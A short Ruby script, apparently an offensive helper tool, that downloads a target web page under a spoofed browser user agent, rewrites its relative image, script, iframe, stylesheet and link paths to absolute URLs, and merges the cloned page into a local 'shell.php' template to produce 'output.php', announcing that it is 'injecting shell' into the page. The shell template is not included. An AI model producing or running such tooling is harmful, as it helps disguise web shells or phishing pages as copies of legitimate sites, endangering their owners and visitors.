#!/usr/bin/env ruby
#
require 'open-uri'
require 'rubygems'
require 'erb'
require 'mechanize'
require 'uri'

@agent = Mechanize.new()
@agent.user_agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
url = ARGV[0]

baseurl = URI(url).scheme + "://" + URI(url).host

puts "Injecting shell into #{url}"

begin
	page_raw = @agent.get(url).body()
rescue Mechanize::ResponseCodeError => ex
	page_raw = ex.page.body
end

page_html = Nokogiri::HTML(page_raw)

fixes = 0

["img","script","iframe"].each do |type|
	page_html.css(type).each do |thing|
		begin
			if thing["src"][0..3] != "http" and thing["src"][0..1] == "//"
				thing["src"] = "http:" + thing["src"]
				fixes += 1
			elsif thing["src"][0] == "/"
				thing["src"] = baseurl + thing["src"]
				fixes += 1
			elsif thing["src"][0..1] == ".."
				thing["src"] = url + thing["src"]
				fixes += 1
			end
		rescue
		end
	end
end

["css","a"].each do |type|
	page_html.css(type).each do |thing|
		begin
			if thing["href"][0..3] != "http" and thing["href"][0..1] == "//"
				thing["href"] = "http:" + thing["href"]
				fixes += 1
			elsif thing["href"][0] == "/"
				thing["href"] = baseurl + thing["href"]
				fixes += 1
			elsif thing["href"][0..1] == ".."
				thing["href"] = url + thing["href"]
				fixes += 1
			end
		rescue
		end
	end
end

puts "Fixed #{fixes} dependency issues"

$page = page_html.to_html

shell = File.open("shell.php", "r").read()
result = ERB.new(shell).result()
output = "output.php"

File.open(output, "w") { |file| file.write(result) }
puts "Page injected to #{output}"
